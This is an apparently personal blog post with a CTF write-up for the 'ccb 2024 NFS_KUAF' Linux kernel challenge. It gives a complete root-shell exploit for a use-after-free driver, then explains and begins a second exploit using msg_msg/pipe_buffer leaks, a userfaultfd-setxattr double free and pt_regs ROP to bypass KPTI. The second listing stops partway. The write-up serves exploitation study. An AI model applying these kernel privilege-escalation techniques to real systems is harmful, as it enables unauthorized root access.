@@ -1,0 +1,598 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;">
+    <title>ccb 2024 NFS_KUAF</title>
+    <link rel="icon" type="image/svg+xml" href="/favicon.svg">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <header>
+        <nav class="site-nav">
+            <a href="./index.html" class="nav-link">/home</a>
+            <span class="nav-separator">|</span>
+            <a href="./about.html" class="nav-link">/about</a>
+        </nav>
+        <div class="terminal-prompt">
+            <span style="color:#666">[</span><span style="color:#fabd2f">ayoung</span><span style="color:#666">@</span><span style="color:#59adeb">lab</span> <span style="color:#83a598"><a href="./index.html" class="path-link">posts</a></span><span style="color:#666">]$</span> 
+            <span class="cmd">cat ./ccb 2024 NFS_KUAF.md</span><span class="cursor">█</span>
+        </div>
+        <h1 class="post-title">ccb 2024 NFS_KUAF</h1><div style="color: #666; font-size: 0.8rem; margin-bottom: 20px;">[Last modified: 2026-02-09]</div>
+    </header>
+    <div class="layout-grid">
+                <main><p>有0x400的uaf 和 能直接指定地址跳转的后门</p>
+<h2 id="exp1">exp1</h2><p>条件：没开aslr smap smep
+直接用后门跳用户代码提权并退出内核态</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">_GNU_SOURCE
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">errno.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">stdio.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">stdlib.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">unistd.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/wait.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/stat.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">fcntl.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sched.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">string.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/ioctl.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/mman.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/types.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/ipc.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/msg.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#c0c5ce;">size_t user_cs,user_ss,user_rflags,user_sp;
+</span><span style="color:#c0c5ce;">size_t commit_creds=</span><span style="color:#d08770;">0xffffffff810c5010</span><span style="color:#c0c5ce;">,prepare_kernel_cred=</span><span style="color:#d08770;">0xffffffff810c5270</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">size_t getshell_addr;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">save_status</span><span style="color:#c0c5ce;">()
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">__asm__</span><span style="color:#c0c5ce;">(
+</span><span style="color:#c0c5ce;">    &quot;</span><span style="color:#a3be8c;">mov user_cs,cs;</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">    &quot;</span><span style="color:#a3be8c;">mov user_ss,ss;</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">    &quot;</span><span style="color:#a3be8c;">mov user_sp,rsp;</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">    &quot;</span><span style="color:#a3be8c;">pushf;</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">    &quot;</span><span style="color:#a3be8c;">pop user_rflags;</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">  );
+</span><span style="color:#c0c5ce;">  </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[*] status has been saved.</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">com</span><span style="color:#c0c5ce;">(){
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">__asm__</span><span style="color:#c0c5ce;">(
+</span><span style="color:#c0c5ce;">        &quot;</span><span style="color:#a3be8c;">push rax;</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">        &quot;</span><span style="color:#a3be8c;">push rdi;</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">        &quot;</span><span style="color:#a3be8c;">mov rax, 0xffffffff810c5270;</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">        &quot;</span><span style="color:#a3be8c;">mov rdi, 0;</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">        &quot;</span><span style="color:#a3be8c;">call rax;</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">        &quot;</span><span style="color:#a3be8c;">mov rdi, rax;</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">        &quot;</span><span style="color:#a3be8c;">mov rax, 0xffffffff810c5010;</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">        &quot;</span><span style="color:#a3be8c;">call rax;</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">        &quot;</span><span style="color:#a3be8c;">mov rax, getshell_addr;</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">        &quot;</span><span style="color:#a3be8c;">push user_ss;</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">        &quot;</span><span style="color:#a3be8c;">push user_sp;</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">        &quot;</span><span style="color:#a3be8c;">push user_rflags;</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">        &quot;</span><span style="color:#a3be8c;">push user_cs;</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">        &quot;</span><span style="color:#a3be8c;">push getshell_addr;</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">        &quot;</span><span style="color:#a3be8c;">swapgs;</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">        &quot;</span><span style="color:#a3be8c;">iretq;</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">        &quot;</span><span style="color:#a3be8c;">ret;</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">    );
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">getshell</span><span style="color:#c0c5ce;">(){
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if</span><span style="color:#c0c5ce;">(!</span><span style="color:#8fa1b3;">getuid</span><span style="color:#c0c5ce;">()){
+</span><span style="color:#c0c5ce;">		</span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[*]Root now</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">		</span><span style="color:#96b5b4;">system</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/bin/sh</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">	}
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">else</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">		</span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">not root yet</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">	}
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">main</span><span style="color:#c0c5ce;">()
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">save_status</span><span style="color:#c0c5ce;">();
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> fd = </span><span style="color:#8fa1b3;">open</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/dev/uaf_device</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(fd&lt;</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">perror</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">open</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> buf[</span><span style="color:#d08770;">0x500</span><span style="color:#c0c5ce;">];
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(buf, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x500</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    getshell_addr = (size_t)getshell;
+</span><span style="color:#c0c5ce;">    *(size_t *)buf = (size_t)com;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">write</span><span style="color:#c0c5ce;">(fd, buf, </span><span style="color:#d08770;">0x8</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">read</span><span style="color:#c0c5ce;">(fd, buf, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">}
+</span></pre>
+<h2 id="exp2">exp2</h2><p>条件：保护全开</p>
+<p>首先在存在 UAF 的 object 下方布置 <code>pipe_buffer</code> ，使用 <code>msg_msg</code> 占位，修改<code>m_ts</code>字段泄露<code>pipe_buffer</code> 中的 <code>pipe_buf_operations</code> 地址来泄露基址</p>
+<p>之后通过 msg_msg 构造 double free
+如下所示红色为利用 UAF 控制的 msg 结构体，下方有一个紧挨着的msg，同时由于使用相同 qid 发送了第二段长度为<code>0x1018-0x30</code>的消息，第二段消息会使用<code>ll_prev</code>链接；第二段消息多出来0x18内容会申请到 kmalloc-32 大小 object ，由开头8字节 <code>next</code> 指针和0x18字节真实内容组成</p>
+<p>此时能够通过控制的 msg obj 越界读泄露<code>ll_prev</code>地址，再伪造 <code>next</code> 和 <code>m_ts</code> 做任意地址读，获取到第二段消息的 next 指针，即图中紫色 kmalloc-32 大小的 obj 地址。再将控制的 msg 的 next 覆盖指向 kmalloc-32 的 obj，从而构造出两个 msg 的 next 指向同一个 <code>msg_msgseg</code>，后续释放消息即可构造出 double free</p>
+<p><img src="./images/msg_msg.drawio%20%281%29.png" alt="" /></p>
+<p>实际过程中，有几个需要额外注意的地方：</p>
+<ul>
+<li>释放第二段 msg 需要先接收前一段 msg ，不加 <code>MSG_COPY</code> 即可释放</li>
+<li>接收并释放过程中存在 <code>__check_object_size</code>，利用 UAF 控制的 msg 的 <code>m_ts</code>字段需要恢复为原值（0x400-0x30）；但不影响其继续释放 next 指针指向的 <code>msg_msgseg</code></li>
+<li>最重要的一点，需要控制 <code>msg_msgseg</code> 开头的8字节 next 指针为NULL。<code>store_msg</code> 中会沿着 next 单向链表执行<code>copy_to_user</code>复制东西，如果不控制其为NULL，当第二次 free 时会有异或处理的 freelist_ptr 残留造成crash</li>
+</ul>
+<p>使用<code>userfault</code>+<code>setxattr</code>覆盖被释放的 <code>msg_msgseg</code> fd指针为 NULL</p>
+<p><code>setxattr</code>可以直接写值，调用链<code>SYS_setxattr()-&gt;path_setxattr()-&gt;setxattr()</code>
+size 和 value 均可控</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#b48ead;">static long
+</span><span style="color:#8fa1b3;">setxattr</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> dentry *</span><span style="color:#bf616a;">d</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">const char</span><span style="color:#c0c5ce;"> __user *</span><span style="color:#bf616a;">name</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">const void</span><span style="color:#c0c5ce;"> __user *</span><span style="color:#bf616a;">value</span><span style="color:#c0c5ce;">,
+</span><span style="color:#c0c5ce;">     size_t </span><span style="color:#bf616a;">size</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">flags</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">//...
+</span><span style="color:#c0c5ce;">        kvalue = </span><span style="color:#8fa1b3;">kvmalloc</span><span style="color:#c0c5ce;">(size, GFP_KERNEL);
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(!kvalue)
+</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">-ENOMEM;
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">copy_from_user</span><span style="color:#c0c5ce;">(kvalue, value, size)) {
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">//,..
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">kvfree</span><span style="color:#c0c5ce;">(kvalue);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> error;
+</span><span style="color:#c0c5ce;">}
+</span></pre>
+<p>控制 <code>setxatrr</code> 调用申请回 <code>victim obj</code> 后先覆写前8字节为0，继续 <code>copy</code> 时触发缺页卡住，然后通过 msg 释放掉 <code>victim obj</code>，再控制先释放一个其他 obj 避免检测到 double free，最后再放行刚才卡住的 <code>setxatrr</code>，使其继续执行释放掉刚才申请到的 <code>victim obj</code>，完成double free
+<code>victim obj -&gt; A -&gt; victim obj</code></p>
+<p><img src="./images/Pasted%20image%2020240918190057.png" alt="" /></p>
+<p>在实操过程中发现可能 <code>pthread_create</code>创建线程会申请掉 kmalloc-32 的obj，故需要进行一定布置
+另外exp中使用全局变量完成线程和当前进程的同步，确保释放顺序得当</p>
+<p>完成double free后，最后利用 <code>seq_operations</code>+<code>setxatrr</code>控制执行流，结合<code>pt_regs</code> rop 提权
+<code>seq_operations</code>结构为</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">seq_operations {
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">* (*start) (</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> seq_file *m, loff_t *pos);
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">(*stop) (</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> seq_file *m, </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*v);
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">* (*next) (</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> seq_file *m, </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*v, loff_t *pos);
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">(*show) (</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> seq_file *m, </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*v);
+</span><span style="color:#c0c5ce;">};
+</span></pre>
+<p><code>read</code>函数最终能调用到<code>seq_operations-&gt;start</code>
+通过<code>setxatrr</code>覆盖该函数指针为<code>add rsp xxxx, ret</code>，并在缺页中调用<code>read</code>触发</p>
+<p><code>pt_regs</code>结构
+<img src="./images/Pasted%20image%2020240918191958.png" alt="" /></p>
+<p>定义</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">pt_regs {
+</span><span style="color:#65737e;">/*
+</span><span style="color:#65737e;"> * C ABI says these regs are callee-preserved. They aren&#39;t saved on kernel entry
+</span><span style="color:#65737e;"> * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;.
+</span><span style="color:#65737e;"> */
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;"> r15;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;"> r14;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;"> r13;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;"> r12;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;"> rbp;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;"> rbx;
+</span><span style="color:#65737e;">/* These regs are callee-clobbered. Always saved on kernel entry. */
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;"> r11;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;"> r10;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;"> r9;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;"> r8;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;"> rax;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;"> rcx;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;"> rdx;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;"> rsi;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;"> rdi;
+</span><span style="color:#65737e;">/*
+</span><span style="color:#65737e;"> * On syscall entry, this is syscall#. On CPU exception, this is error code.
+</span><span style="color:#65737e;"> * On hw interrupt, it&#39;s IRQ number:
+</span><span style="color:#65737e;"> */
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;"> orig_rax;
+</span><span style="color:#65737e;">/* Return frame for iretq */
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;"> rip;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;"> cs;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;"> eflags;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;"> rsp;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;"> ss;
+</span><span style="color:#65737e;">/* top of stack page */
+</span><span style="color:#c0c5ce;">};
+</span></pre>
+<p><code>pt_regs</code>布置 rop 中<code>swapgs_restore_regs_and_return_to_usermode</code>中对<code>cr3</code>赋值来绕过kpti，并返回用户态。具体跳转位置根据栈情况确定，要保证开始执行多个 pop 后的<code>mov rdi,rsp</code>时栈顶有两个无关值，且下一个是rip cs xxxx这些值
+<img src="./images/Pasted%20image%2020240918192613.png" alt="" /></p>
+<p>这样在swapgsxxxx这个gadget最后的两个pop后正好是从而返回用户态</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">swapgs
+</span><span style="color:#c0c5ce;">xxx
+</span><span style="color:#c0c5ce;">iretq
+</span></pre>
+<p>完整exp</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">_GNU_SOURCE
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">errno.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">stdio.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">stdlib.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">unistd.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sched.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">string.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/ioctl.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/mman.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/msg.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">mqueue.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/xattr.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">linux/userfaultfd.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">poll.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">stdint.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">pthread.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/syscall.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">PAGE_SIZE </span><span style="color:#d08770;">0x1000
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">size_t user_cs,user_ss,user_rflags,user_sp;
+</span><span style="color:#c0c5ce;">size_t commit_creds=</span><span style="color:#d08770;">0xc5010</span><span style="color:#c0c5ce;">,prepare_kernel_cred=</span><span style="color:#d08770;">0xc5270</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">size_t init_cred = </span><span style="color:#d08770;">0x165f5a0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">size_t mov_cr4_rdi = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">size_t swapgs_popfq_r = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">size_t mov_rdi_rax_ret = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">size_t add_rsp = </span><span style="color:#d08770;">0x86739f</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">size_t ireq_ret = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">size_t prdi_r = </span><span style="color:#d08770;">0x88850</span><span style="color:#c0c5ce;">, prbx_r = </span><span style="color:#d08770;">0x6d15f</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">size_t kobase = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">size_t vmbase = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">size_t canary = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">size_t swapgs_restore_regs_and_return_to_usermode = </span><span style="color:#d08770;">0xc009f4</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">size_t heap_addr = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, llprev_addr, llnext_addr = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, victim_addr = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> real_qid;
+</span><span style="color:#c0c5ce;">pthread_t hthr[</span><span style="color:#d08770;">20</span><span style="color:#c0c5ce;">];
+</span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> received[</span><span style="color:#d08770;">0x2000</span><span style="color:#c0c5ce;">];
+</span><span style="color:#c0c5ce;">size_t release_cnt=</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">size_t setxa_can_release = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">size_t msg_can_release = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> fd_stat[</span><span style="color:#d08770;">20</span><span style="color:#c0c5ce;">];
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">ErrExit</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;">* </span><span style="color:#bf616a;">err_msg</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">	</span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(err_msg);
+</span><span style="color:#c0c5ce;">	</span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(-</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">save_status</span><span style="color:#c0c5ce;">()
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">__asm__</span><span style="color:#c0c5ce;">(
+</span><span style="color:#c0c5ce;">    &quot;</span><span style="color:#a3be8c;">mov user_cs,cs;</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">    &quot;</span><span style="color:#a3be8c;">mov user_ss,ss;</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">    &quot;</span><span style="color:#a3be8c;">mov user_sp,rsp;</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">    &quot;</span><span style="color:#a3be8c;">pushf;</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">    &quot;</span><span style="color:#a3be8c;">pop user_rflags;</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">  );
